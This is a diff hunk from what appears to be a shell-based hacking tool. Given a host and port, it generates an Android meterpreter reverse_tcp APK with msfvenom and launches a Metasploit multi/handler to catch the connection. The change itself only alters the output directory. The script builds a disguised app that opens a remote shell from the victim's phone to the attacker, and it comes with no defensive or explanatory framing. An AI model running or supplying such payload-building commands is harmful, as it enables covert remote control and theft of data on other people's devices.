@@ -897,7 +897,7 @@ echo
 read -p "Enter The Host: " host
 read -p "Enter The Port: " port
 read -p "Enter the Name: " name
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /home/frah7834/M2/$name.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /home/g01technohack/$name.apk
 msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp'
 fi
 if [ $payload = 2 ]
